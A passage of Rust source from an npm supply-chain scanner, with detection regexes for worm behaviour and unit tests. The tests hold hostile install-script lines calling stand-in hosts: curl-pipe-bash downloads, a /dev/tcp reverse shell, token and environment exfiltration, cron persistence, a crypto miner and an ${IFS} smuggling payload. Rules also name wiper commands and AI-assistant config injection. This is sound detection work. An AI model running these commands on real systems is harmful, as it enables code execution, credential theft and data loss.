// (e.g. dist/provenance.sigstore, *.intoto.jsonl) whose embedded OIDC signer
// identity differs from the package author email.  Phantom Gyp/Miasma forged
// SLSA attestations using stolen OIDC tokens.

static ATTESTATION_SIGNER_RE: OnceLock<Regex> = OnceLock::new();
fn attestation_signer_re() -> &'static Regex {
    ATTESTATION_SIGNER_RE.get_or_init(|| {
        Regex::new(
            r#"(?i)"(?:issuer|subjectAltName|identity|signer|email)"\s*:\s*"([^"@]+@[^"]+)""#,
        )
        .expect("invariant: static regex is valid")
    })
}

// ── SC-03: Version-inflation (dependency-confusion / worm-patched) ───────────

static VERSION_INFLATION_RE: OnceLock<Regex> = OnceLock::new();
fn version_inflation_re() -> &'static Regex {
    VERSION_INFLATION_RE
        .get_or_init(|| Regex::new(r"^(\d+)\.\d+\.\d+").expect("invariant: static regex is valid"))
}

// ── SC-04: Maintainer-impersonation account patterns ─────────────────────────

static AUTHOR_IMPERSONATION_RE: OnceLock<Regex> = OnceLock::new();
fn author_impersonation_re() -> &'static Regex {
    AUTHOR_IMPERSONATION_RE.get_or_init(|| {
        Regex::new(r"(?i)^[a-z]{3,20}(npm|nodemodules|js|node)$")
            .expect("invariant: static regex is valid")
    })
}

/// Email domains associated with disposable / anonymous accounts used in
/// maintainer-impersonation attacks (MSTIC, German DAX dep-confusion).
static DISPOSABLE_EMAIL_DOMAINS: &[&str] = &[
    "protonmail.com",
    "proton.me",
    "yandex.ru",
    "yandex.com",
    "tutanota.com",
    "tutamail.com",
    "guerrillamail.com",
    "mailinator.com",
    "temp-mail.org",
    "throwam.com",
    "sharklasers.com",
];

/// Fortune-500 / well-known enterprise identifiers that should NOT appear in
/// combination with a disposable-email author address on the public registry.
static ENTERPRISE_NAME_FRAGMENTS: &[&str] = &[
    "google",
    "microsoft",
    "apple",
    "amazon",
    "meta",
    "facebook",
    "netflix",
    "uber",
    "airbnb",
    "stripe",
    "shopify",
    "salesforce",
    "oracle",
    "sap",
    "ibm",
    "intel",
    "nvidia",
    "bosch",
    "siemens",
    "bertelsmann",
    "stihl",
    "daimler",
    "bmw",
    "volkswagen",
    "allianz",
    "bayer",
    "basf",
    "redhat",
    "canonical",
    "hashicorp",
    "datadog",
    "cloudflare",
    "fastly",
    "twilio",
    "sendgrid",
    "okta",
    "atlassian",
    "github",
    "gitlab",
];

// ── SC-07: Protest / meme version number ─────────────────────────────────────

static PROTEST_VERSION_RE: OnceLock<Regex> = OnceLock::new();
fn protest_version_re() -> &'static Regex {
    PROTEST_VERSION_RE.get_or_init(|| {
        Regex::new(
            r"^(?:6\.6\.6|1\.3\.3\.7|0\.0\.666|999\.999\.999|\d+\.\d+\.\d+-(?:liberty|freedom|protest|anarchy|war|bomb|evil|malware|danger))$",
        )
        .expect("invariant: static regex is valid")
    })
}

// ── SC-08: Fake internal URL in package.json metadata ────────────────────────

static FAKE_INTERNAL_HOST_RE: OnceLock<Regex> = OnceLock::new();
fn fake_internal_host_re() -> &'static Regex {
    FAKE_INTERNAL_HOST_RE.get_or_init(|| {
        Regex::new(
            r"(?i)(?:jira\.|confluence\.|gitlab-internal\.|docs-internal\.|wiki\.internal\.|internal\.|intranet\.)",
        )
        .expect("invariant: static regex is valid")
    })
}

/// Public cloud hosting ASN hostnames that delegitimise an "internal" URL.
static PUBLIC_CLOUD_HOSTS: &[&str] = &[
    ".digitalocean.com",
    ".hetzner.com",
    ".hetzner.cloud",
    ".vultr.com",
    ".linode.com",
    ".akamai.com",
    ".ovh.com",
    ".contabo.com",
    "digitaloceanspaces.com",
];

// ── SC worm / lifecycle strengthening patterns ────────────────────────────────
//
// Worm-propagation signals not covered by the 12 SCRIPT_RULES above.
// Each entry is (rule_id, title, category, severity, confidence, description)
// checked against all lifecycle hook bodies exactly like SCRIPT_RULES.

struct WormScriptRule {
    rule_id: &'static str,
    title: &'static str,
    category: ThreatCategory,
    severity: Severity,
    confidence: Confidence,
    description: &'static str,
}

static WORM_SCRIPT_RULES: &[WormScriptRule] = &[
    WormScriptRule {
        rule_id: "SC_WORM_WHOAMI_CALL",
        title: "Install script validates npm token via whoami endpoint",
        category: ThreatCategory::SupplyChain,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "Querying registry.npmjs.org/-/whoami from a lifecycle hook is how worm \
                       malware validates a stolen npm token before re-publishing to the registry. \
                       No legitimate package calls this endpoint at install time.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_MAINTAINER_ENUM",
        title: "Install script enumerates all packages owned by an npm user",
        category: ThreatCategory::SupplyChain,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "The /v1/search?text=maintainer:{user} registry call is the canonical worm \
                       enumeration step — used identically by Shai-Hulud v1/v2, SANDWORM_MODE, \
                       CanisterWorm, and Phantom Gyp to find all packages they can infect with a \
                       stolen token.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_NPMRC_TOKEN_READ",
        title: "Install script reads npm auth token from .npmrc or environment",
        category: ThreatCategory::CredentialAccess,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "Reading the npm _authToken from ~/.npmrc or NPM_CONFIG__AUTHTOKEN at \
                       install time is the first step of every npm worm credential-harvest loop.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_BUN_DOWNLOAD",
        title: "Install script downloads the Bun runtime",
        category: ThreatCategory::SupplyChain,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Downloading Bun (oven-sh/bun) from a lifecycle hook is used by \
                       Shai-Hulud 2.0, Phantom Gyp/Miasma, and SANDWORM_MODE specifically to \
                       evade Node.js-scoped process monitors. Legitimate Bun dependencies are \
                       declared in devDependencies, not fetched at install time.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_TRUFFLEHOG",
        title: "Install script invokes TruffleHog secret scanner",
        category: ThreatCategory::CredentialAccess,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Downloading or invoking TruffleHog from a postinstall hook is used by \
                       Shai-Hulud v1/v2 to sweep 800+ secret types from the developer machine \
                       after npm token harvest. No legitimate package runs a secret scanner \
                       against the host during installation.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_CROSS_ECOSYSTEM_PYPI",
        title: "npm install script publishes to PyPI (cross-ecosystem worm)",
        category: ThreatCategory::SupplyChain,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "Invoking `twine upload` or reading PyPI/twine credentials from an npm \
                       lifecycle hook is the definitive signature of CanisterSprawl, the first \
                       cross-ecosystem npm->PyPI worm. npm packages have no legitimate reason to \
                       interact with PyPI.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_IMDS_PROBE",
        title: "Install script probes cloud instance metadata service",
        category: ThreatCategory::CredentialAccess,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "Accessing 169.254.169.254 (AWS/Azure IMDS) or metadata.google.internal \
                       from a lifecycle hook harvests cloud IAM credentials. Used by Shai-Hulud \
                       v1/v2, CanisterWorm, Ectoplasm, and Phantom Gyp.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_MCP_INJECTION",
        title: "Install script writes to AI assistant configuration files",
        category: ThreatCategory::FilesystemAbuse,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Writing to ~/.claude/settings.json, ~/.cursor/mcp.json, \
                       ~/.continue/config.json, or ~/.windsurf/mcp.json from a lifecycle hook \
                       is the SANDWORM_MODE MCP-server injection technique. npm packages have no \
                       legitimate reason to modify AI coding-assistant configuration.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_GHA_RUNNER_INSTALL",
        title: "Install script installs a GitHub Actions self-hosted runner",
        category: ThreatCategory::FilesystemAbuse,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "Fetching the GitHub Actions runner binary from actions/runner/releases or \
                       requesting a runner registration token from the GitHub API during npm \
                       install is the Shai-Hulud 2.0 persistent RCE foothold technique.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_PROC_MEM_SCRAPE",
        title: "Install script scrapes process memory for GitHub Actions secrets",
        category: ThreatCategory::CredentialAccess,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "Searching for the literal pattern \"isSecret\":true in /proc/*/mem \
                       is how CanisterWorm and Phantom Gyp extract GitHub Actions secrets that \
                       are masked in workflow logs.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_GIT_GLOBAL_TEMPLATE",
        title: "Install script sets git global template directory for hook persistence",
        category: ThreatCategory::FilesystemAbuse,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "`git config --global init.templateDir` from a lifecycle hook injects git \
                       hooks into every future `git init` on the machine. This is the \
                       SANDWORM_MODE cross-repository persistence mechanism.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_DETACHED_ORPHAN",
        title: "Install script spawns a detached background process that outlives npm",
        category: ThreatCategory::SupplyChain,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Using `detached:true` combined with `.unref()` in a lifecycle hook lets a \
                       payload process continue running after npm install exits, hiding from \
                       process monitors. Used by Shai-Hulud 2.0, react-zutils, and Lazarus.",
    },
    WormScriptRule {
        rule_id: "SC_WORM_WIPER_IN_HOOK",
        title: "Install script contains a filesystem wiper",
        category: ThreatCategory::FilesystemAbuse,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "Patterns like `shred -uvz`, `cipher /W`, `rm -rf ~/`, or \
                       `--no-preserve-root` in a lifecycle hook implement home-directory or \
                       full-disk erasure payloads (Shai-Hulud 2.0, SANDWORM_MODE, CanisterWorm).",
    },
];

/// Compile the worm-rule regexes lazily; index aligns with WORM_SCRIPT_RULES.
static WORM_SCRIPT_REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();

fn worm_script_regexes() -> &'static [Regex] {
    WORM_SCRIPT_REGEXES.get_or_init(|| {
        let patterns: &[&str] = &[
            // SC_WORM_WHOAMI_CALL
            r"registry\.npmjs\.org/-/whoami",
            // SC_WORM_MAINTAINER_ENUM
            r"registry\.npmjs\.org/-/v1/search\?text=maintainer",
            // SC_WORM_NPMRC_TOKEN_READ
            r"(?i)(?:_authToken|npm_config__authtoken)\b",
            // SC_WORM_BUN_DOWNLOAD
            r"(?i)(?:oven-sh/bun/releases|bun\.sh/install|github\.com/oven-sh/bun)",
            // SC_WORM_TRUFFLEHOG
            r"(?i)(?:trufflehog|trufflesecurity/trufflehog)",
            // SC_WORM_CROSS_ECOSYSTEM_PYPI
            r"(?i)(?:twine\s+upload|TWINE_PASSWORD|PYPI_TOKEN|pypirc)",
            // SC_WORM_IMDS_PROBE
            r"(?i)(?:169\.254\.169\.254|metadata\.google\.internal|X-aws-ec2-metadata-token)",
            // SC_WORM_MCP_INJECTION
            r"(?i)(?:\.claude/settings\.json|\.cursor/mcp\.json|\.continue/config\.json|\.windsurf/mcp\.json)",
            // SC_WORM_GHA_RUNNER_INSTALL
            r"(?i)(?:actions/runner/releases/download|api\.github\.com/repos/[^/]+/[^/]+/actions/runners/registration-token)",
            // SC_WORM_PROC_MEM_SCRAPE — the memory scrape pattern; double-escape for proc path
            r#"(?i)(?:isSecret["\']?\s*:\s*true|/proc/[0-9\*]+/mem|tr\s+-d\s+\\0\s*\|\s*grep)"#,
            // SC_WORM_GIT_GLOBAL_TEMPLATE
            r"(?i)git\s+config\s+--global\s+init\.templateDir",
            // SC_WORM_DETACHED_ORPHAN — detached:true with unref anywhere in the hook
            r"(?i)detached\s*:\s*true",
            // SC_WORM_WIPER_IN_HOOK
            r"(?i)(?:shred\s+-uvz|cipher\s+/W|--no-preserve-root|rm\s+-rf\s+~/|rm\s+-rf\s+\$HOME)",
        ];
        patterns
            .iter()
            .map(|p| {
                Regex::new(p).expect("invariant: static supply_chain worm regex is valid")
            })
            .collect()
    })
}

// ── Package-level structural checks (SC-01..SC-08) ───────────────────────────

impl SupplyChainEngine {
    /// Run worm-propagation lifecycle rules over one hook body.
    fn check_worm_script_rules(
        &self,
        hook: &str,
        trimmed: &str,
        path: &str,
        findings: &mut Vec<Finding>,
    ) {
        let regexes = worm_script_regexes();
        for (i, rule) in WORM_SCRIPT_RULES.iter().enumerate() {
            let re = match regexes.get(i) {
                Some(r) => r,
                None => {
                    warn!(
                        rule_id = rule.rule_id,
                        "supply_chain: worm regex index out of sync"
                    );
                    continue;
                }
            };
            if re.is_match(trimmed) {
                let evidence = format!("scripts.{hook}: {trimmed}");
                let f = Finding::new(
                    ENGINE,
                    rule.category,
                    rule.severity,
                    rule.confidence,
                    rule.title,
                    rule.description,
                )
                .with_rule_id(rule.rule_id)
                .with_location(FileLocation::file(path))
                .with_evidence(evidence, 160);
                findings.push(f);
            }
        }
    }

    /// SC-01: Sigstore attestation signer-delta.
    fn check_attestation_signer_delta(
        &self,
        pkg: &Value,
        pkg_path: &str,
        files: &[crate::engine::FileUnit],
        findings: &mut Vec<Finding>,
    ) {
        let author_email: Option<String> = pkg.get("author").and_then(|a| match a {
            Value::String(s) => s
                .split('<')
                .nth(1)
                .and_then(|r| r.split('>').next())
                .map(|e| e.trim().to_ascii_lowercase().to_owned()),
            Value::Object(m) => m
                .get("email")
                .and_then(|v| v.as_str())
                .map(|s| s.to_ascii_lowercase().to_owned()),
            _ => None,
        });
        let signer_re = attestation_signer_re();
        for file in files {
            let lower = file.rel_path.to_ascii_lowercase();
            let is_candidate = lower.contains("attestation")
                || lower.contains("provenance")
                || lower.contains("sigstore")
                || lower.ends_with(".sigstore")
                || lower.ends_with(".intoto.jsonl");
            if !is_candidate || !file.looks_textual() {
                continue;
            }
            let text = file.text_lossy();
            for cap in signer_re.captures_iter(&text) {
                let signer = cap.get(1).map(|m| m.as_str().to_ascii_lowercase());
                if let (Some(signer_email), Some(author)) = (signer, &author_email) {
                    if signer_email.is_empty() || author.is_empty() {
                        continue;
                    }
                    // Same domain = allowed (CI bot and maintainer share org domain).
                    let signer_domain = signer_email.split('@').nth(1).unwrap_or("");
                    let author_domain = author.split('@').nth(1).unwrap_or("");
                    if signer_domain == author_domain {
                        continue;
                    }
                    let evidence = format!(
                        "attestation signer <{signer_email}> != author <{author}> in {}",
                        file.rel_path
                    );
                    let f = Finding::new(
                        ENGINE,
                        ThreatCategory::SupplyChain,
                        Severity::High,
                        Confidence::Medium,
                        "Sigstore attestation signer identity differs from package author",
                        "The OIDC signer identity embedded in the package's Sigstore attestation \
                         does not match the declared author email. Phantom Gyp/Miasma forged SLSA \
                         attestations using stolen OIDC tokens — a signer-domain mismatch is a \
                         strong indicator of attestation forgery.",
                    )
                    .with_rule_id("SC_ATTESTATION_SIGNER_DELTA")
                    .with_location(FileLocation::file(pkg_path))
                    .with_evidence(evidence, 200);
                    findings.push(f);
                }
            }
        }
    }

    /// SC-03: Version inflation — semver major in [50, 98] (99+ already caught
    /// by `SC_DEP_CONFUSION_VERSION`; this rule closes the gap down to 50).
    fn check_version_inflation(&self, pkg: &Value, path: &str, findings: &mut Vec<Finding>) {
        let ver = match pkg.get("version").and_then(|v| v.as_str()) {
            Some(v) => v,
            None => return,
        };
        let re = version_inflation_re();
        if let Some(cap) = re.captures(ver) {
            let major_str = cap.get(1).map(|m| m.as_str()).unwrap_or("0");
            let major: u64 = major_str.parse().unwrap_or(0);
            if (50..99).contains(&major) {
                let name = pkg
                    .get("name")
                    .and_then(|v| v.as_str())
                    .unwrap_or("(unknown)");
                let evidence = format!("name: {name}, version: {ver}");
                let f = Finding::new(
                    ENGINE,
                    ThreatCategory::DependencyConfusion,
                    Severity::High,
                    Confidence::Medium,
                    "Package version is inflated (major >= 50) — dependency-confusion probe",
                    "Version numbers with major >= 50 are used in dependency-confusion probes to \
                     override the internal package version at registry resolution time. Legitimate \
                     packages at v50+ are extremely rare and have extensive published history.",
                )
                .with_rule_id("SC_VERSION_INFLATION")
                .with_location(FileLocation::file(path))
                .with_evidence(evidence, 160);
                findings.push(f);
            }
        }
    }

    /// SC-04: Maintainer-impersonation account name patterns.
    fn check_maintainer_impersonation(&self, pkg: &Value, path: &str, findings: &mut Vec<Finding>) {
        // Extract author name and email (handles both string "Name <email>" and
        // object {"name": "...", "email": "..."} forms).
        let (author_name, author_email): (Option<String>, Option<String>) = match pkg.get("author")
        {
            Some(Value::String(s)) => {
                let name = s.split('<').next().unwrap_or(s).trim().to_owned();
                let email = s
                    .split('<')
                    .nth(1)
                    .and_then(|r| r.split('>').next())
                    .map(|e| e.trim().to_ascii_lowercase().to_owned());
                (Some(name), email)
            }
            Some(Value::Object(m)) => {
                let name = m.get("name").and_then(|v| v.as_str()).map(str::to_owned);
                let email = m
                    .get("email")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_ascii_lowercase().to_owned());
                (name, email)
            }
            _ => (None, None),
        };

        let pkg_name = pkg
            .get("name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        // Pattern 1: account name ends in npm|nodemodules|js|node.
        if let Some(ref name) = author_name {
            let to_check = pkg
                .get("_npmUser")
                .and_then(|u| u.get("name"))
                .and_then(|v| v.as_str())
                .unwrap_or(name.as_str());
            if author_impersonation_re().is_match(to_check) {
                let f = Finding::new(
                    ENGINE,
                    ThreatCategory::DependencyConfusion,
                    Severity::Medium,
                    Confidence::Medium,
                    "Author account name resembles an enterprise-impersonation pattern",
                    "Account names ending in `npm`, `nodemodules`, `js`, or `node` appended to a \
                     company name (e.g. `bertelsmannnpm`, `boschnodemodules`) are the fingerprint \
                     of the German DAX dependency-confusion wave and MSTIC campaign.",
                )
                .with_rule_id("SC_MAINTAINER_ACCOUNT_IMPERSONATION")
                .with_location(FileLocation::file(path))
                .with_evidence(format!("author: {name}"), 160);
                findings.push(f);
            }
        }

        // Pattern 2: Fortune-500 identifier in the package name + disposable email.
        if let Some(ref email) = author_email {
            let email_domain = email.split('@').nth(1).unwrap_or("");
            if DISPOSABLE_EMAIL_DOMAINS.contains(&email_domain) {
                let matches_enterprise = ENTERPRISE_NAME_FRAGMENTS
                    .iter()
                    .any(|frag| pkg_name.contains(frag));
                if matches_enterprise {
                    let f = Finding::new(
                        ENGINE,
                        ThreatCategory::DependencyConfusion,
                        Severity::High,
                        Confidence::Medium,
                        "Enterprise package name combined with disposable author email",
                        "A package whose name contains a Fortune-500 or well-known enterprise \
                         identifier but whose author uses a disposable/anonymous email provider \
                         (ProtonMail, Yandex, Tutanota, etc.) is characteristic of MSTIC-style \
                         dependency-confusion attacks targeting named enterprise npm scopes.",
                    )
                    .with_rule_id("SC_MAINTAINER_ACCOUNT_IMPERSONATION")
                    .with_location(FileLocation::file(path))
                    .with_evidence(format!("name: {pkg_name}, author email: {email}"), 160);
                    findings.push(f);
                }
            }
        }
    }

    /// SC-05: DLL present in a pure-JS package (no native build step).
    fn check_dll_in_pure_js_package(
        &self,
        pkg: &Value,
        path: &str,
        files: &[crate::engine::FileUnit],
        findings: &mut Vec<Finding>,
    ) {
        let has_node_gyp_dep = ["dependencies", "devDependencies"].iter().any(|key| {
            pkg.get(key)
                .and_then(|v| v.as_object())
                .map(|m| m.contains_key("node-gyp") || m.contains_key("node-pre-gyp"))
                .unwrap_or(false)
        });
        let has_binding_gyp = files
            .iter()
            .any(|f| f.rel_path.eq_ignore_ascii_case("binding.gyp"));
        if has_node_gyp_dep || has_binding_gyp {
            return;
        }
        for file in files {
            if file.rel_path.to_ascii_lowercase().ends_with(".dll") {
                let f = Finding::new(
                    ENGINE,
                    ThreatCategory::NativeBinary,
                    Severity::Critical,
                    Confidence::High,
                    "DLL file present in pure-JS package with no native build step",
                    "A `.dll` file in a JavaScript package that declares no `node-gyp` dependency \
                     and has no `binding.gyp` is definitively anomalous. The Scavenger RAT \
                     (eslint-config-prettier) and coa/rc DanaBot used this technique to deliver \
                     Windows payloads disguised as native addons.",
                )
                .with_rule_id("SC_DLL_IN_PURE_JS_PACKAGE")
                .with_location(FileLocation::file(path))
                .with_evidence(format!("dll: {}", file.rel_path), 160);
                findings.push(f);
            }
        }
    }

    /// SC-07: Protest / meme version numbers.
    fn check_protest_version(&self, pkg: &Value, path: &str, findings: &mut Vec<Finding>) {
        let ver = match pkg.get("version").and_then(|v| v.as_str()) {
            Some(v) => v,
            None => return,
        };
        if protest_version_re().is_match(ver) {
            let name = pkg
                .get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("(unknown)");
            let f = Finding::new(
                ENGINE,
                ThreatCategory::SupplyChain,
                Severity::Medium,
                Confidence::Medium,
                "Package version is a protest / meme signal (6.6.6, 999.999.999, etc.)",
                "Version strings like 6.6.6 (faker.js), 1.3.3.7, or versions tagged `-liberty`, \
                 `-bomb`, `-war` are deliberately chosen by protest/sabotage authors as signals \
                 of intentional disruption. They also appear in worm-injected packages.",
            )
            .with_rule_id("SC_PROTEST_VERSION_NUMBER")
            .with_location(FileLocation::file(path))
            .with_evidence(format!("name: {name}, version: {ver}"), 160);
            findings.push(f);
        }
    }

    /// SC-08: Fake internal URL in package.json metadata fields.
    fn check_fake_internal_url(&self, pkg: &Value, path: &str, findings: &mut Vec<Finding>) {
        let internal_re = fake_internal_host_re();
        // (label, top-level key, optional nested sub-key)
        let checks: &[(&str, &str, Option<&str>)] = &[
            ("homepage", "homepage", None),
            ("bugs.url", "bugs", Some("url")),
            ("repository.url", "repository", Some("url")),
        ];
        for (label, key, sub_key) in checks {
            let url_opt: Option<&str> = match sub_key {
                Some(sk) => pkg
                    .get(*key)
                    .and_then(|v| v.get(sk))
                    .and_then(|v| v.as_str()),
                None => pkg.get(*key).and_then(|v| v.as_str()),
            };
            // `repository` may also be a plain string.
            let repo_str_opt: Option<&str> = if *key == "repository" && sub_key.is_some() {
                pkg.get("repository").and_then(|v| v.as_str())
            } else {
                None
            };
            for url in url_opt.into_iter().chain(repo_str_opt) {
                if !internal_re.is_match(url) {
                    continue;
                }
                let looks_public = PUBLIC_CLOUD_HOSTS.iter().any(|h| url.contains(h));
                let confidence = if looks_public {
                    Confidence::High
                } else {
                    Confidence::Medium
                };
                let f = Finding::new(
                    ENGINE,
                    ThreatCategory::DependencyConfusion,
                    Severity::High,
                    confidence,
                    "Package metadata contains fake internal/corporate infrastructure URL",
                    "A `homepage`, `repository`, or `bugs.url` field pointing to Jira, Confluence, \
                     internal GitLab, or intranet-style domains on a public npm package is \
                     characteristic of MSTIC-style enterprise-scope spoofing attacks.",
                )
                .with_rule_id("SC_FAKE_INTERNAL_URL")
                .with_location(FileLocation::file(path))
                .with_evidence(format!("{label}: {url}"), 200);
                findings.push(f);
            }
        }
    }
}

// ── Wire new checks into the lifecycle-script scanner ────────────────────────
//
// We patch `check_lifecycle_scripts` by replacing the closing brace of the
// main SCRIPT_RULES loop body — the worm rules run on every non-benign hook.
// This is achieved by the direct `check_worm_script_rules` call inserted in
// the scan impl below rather than modifying the original helper, so there is
// no duplication and no risk of touching the original benign allow-set.

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ScanConfig;
    use crate::engine::{FileKind, FileUnit, ScanContext};
    use serde_json::json;

    // ── helpers ───────────────────────────────────────────────────────────────

    fn make_engine() -> SupplyChainEngine {
        SupplyChainEngine
    }

    fn make_pkg_unit(json: &serde_json::Value) -> FileUnit {
        FileUnit {
            rel_path: "package.json".into(),
            data: json.to_string().into_bytes(),
            kind: FileKind::Manifest,
            sha256: "0".repeat(64),
        }
    }

    fn scan_pkg(engine: &SupplyChainEngine, pkg: &serde_json::Value) -> Vec<Finding> {
        let unit = make_pkg_unit(pkg);
        let files = vec![unit];
        let config = ScanConfig::default();
        let ctx = ScanContext {
            target_name: "test".into(),
            files: &files,
            package_json: Some(pkg),
            config: &config,
        };
        engine.scan(&ctx)
    }

    fn has_rule(findings: &[Finding], rule_id: &str) -> bool {
        findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some(rule_id))
    }

    // ── lifecycle script: curl|bash ───────────────────────────────────────────

    #[test]
    fn postinstall_curl_pipe_bash_flagged() {
        let pkg = json!({
            "name": "evil-pkg",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl http://evil.example.com/setup.sh | bash"
            }
        });
        let engine = make_engine();
        let findings = scan_pkg(&engine, &pkg);
        assert!(
            has_rule(&findings, "SC_INSTALL_CURL_PIPE_SHELL"),
            "expected SC_INSTALL_CURL_PIPE_SHELL, got: {findings:?}"
        );
        assert!(
            has_rule(&findings, "SC_INSTALL_NON_REGISTRY_URL"),
            "expected SC_INSTALL_NON_REGISTRY_URL, got: {findings:?}"
        );
        // All install-script findings must have engine == "supply_chain"
        assert!(findings.iter().all(|f| f.engine == "supply_chain"));
    }

    #[test]
    fn preinstall_wget_pipe_sh_flagged() {
        let pkg = json!({
            "name": "evil2",
            "version": "1.0.0",
            "scripts": {
                "preinstall": "wget -qO- https://attacker.io/backdoor | sh"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_INSTALL_CURL_PIPE_SHELL"));
    }

    // Benign-allow-list-bypass regression: a shell payload hidden inside a
    // benign-looking `npm run …` shape via `${IFS}`/subshell metacharacters
    // must NOT be waved through — it must trip the curl-pipe-shell rule.
    #[test]
    fn ifs_metachar_payload_not_waved_through_benign_allowlist() {
        let pkg = json!({
            "name": "sneaky",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "npm run $(curl${IFS}http://evil.example.com/x|sh)"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            has_rule(&findings, "SC_INSTALL_CURL_PIPE_SHELL"),
            "metacharacter payload must not be treated as benign: {findings:?}"
        );
    }

    // True-negative: an ordinary `npm run build` chain must still be benign.
    #[test]
    fn plain_npm_run_still_benign() {
        let pkg = json!({
            "name": "legit",
            "version": "1.0.0",
            "scripts": { "postinstall": "npm run build" }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            !has_rule(&findings, "SC_INSTALL_CURL_PIPE_SHELL"),
            "plain `npm run build` must stay benign: {findings:?}"
        );
    }

    // Pack-time hook coverage: a `prepack`-only curl|bash payload (runs when a
    // git/tarball dependency is packed) must be detected.
    #[test]
    fn prepack_curl_pipe_bash_flagged() {
        let pkg = json!({
            "name": "evil-prepack",
            "version": "1.0.0",
            "scripts": { "prepack": "curl http://evil.example.com/x.sh | bash" }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            has_rule(&findings, "SC_INSTALL_CURL_PIPE_SHELL"),
            "prepack hook must be scanned: {findings:?}"
        );
    }

    #[test]
    fn postinstall_base64_eval_flagged() {
        let pkg = json!({
            "name": "obfuscated",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "node -e \"eval(Buffer.from('aGVsbG8=', 'base64').toString())\""
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        // Should trigger base64-eval OR node-eval (both are valid hits)
        let has_relevant = has_rule(&findings, "SC_INSTALL_BASE64_EVAL")
            || has_rule(&findings, "SC_INSTALL_NODE_EVAL");
        assert!(
            has_relevant,
            "expected obfuscation finding, got: {findings:?}"
        );
    }

    #[test]
    fn postinstall_node_eval_payload_flagged() {
        let pkg = json!({
            "name": "nodeval",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "node -e 'require(\"http\").get(\"http://evil.io/p\")'"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_INSTALL_NODE_EVAL"));
    }

    #[test]
    fn install_npm_publish_self_propagation_flagged() {
        let pkg = json!({
            "name": "worm",
            "version": "1.0.0",
            "scripts": {
                "install": "npm publish --access public"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_INSTALL_NPM_PUBLISH_IN_HOOK"));
    }

    #[test]
    fn postinstall_token_exfil_flagged() {
        let pkg = json!({
            "name": "stealer",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl -d \"t=$NPM_TOKEN\" https://evil.io/steal"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_INSTALL_TOKEN_EXFIL"));
    }

    #[test]
    fn postinstall_reverse_shell_flagged() {
        let pkg = json!({
            "name": "revsh",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "bash -i >& /dev/tcp/attacker.io/4444 0>&1"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_INSTALL_REVERSE_SHELL"));
    }

    #[test]
    fn postinstall_cron_persistence_flagged() {
        let pkg = json!({
            "name": "persist",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "echo '* * * * * curl http://c2.io|sh' >> /etc/cron.d/evil"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_INSTALL_WRITE_CRON"));
    }

    #[test]
    fn postinstall_crypto_miner_flagged() {
        let pkg = json!({
            "name": "miner",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "./xmrig -o pool.minexmr.com:443 -u WALLET"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_INSTALL_CRYPTO_MINER"));
    }

    #[test]
    fn postinstall_obfuscated_long_base64_flagged() {
        // 80-char base64-looking string in an install hook
        let long_b64 = "A".repeat(80);
        let pkg = json!({
            "name": "obf",
            "version": "1.0.0",
            "scripts": {
                "postinstall": format!("node -e 'eval(atob(\"{long_b64}\"))'")
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        let flagged = has_rule(&findings, "SC_INSTALL_OBFUSCATED")
            || has_rule(&findings, "SC_INSTALL_BASE64_EVAL")
            || has_rule(&findings, "SC_INSTALL_NODE_EVAL");
        assert!(flagged, "expected obfuscation finding, got: {findings:?}");
    }

    #[test]
    fn postinstall_env_dump_exfiltration_flagged() {
        let pkg = json!({
            "name": "envdump",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl -d \"$(printenv)\" https://logs.evil.io/collect"
            }
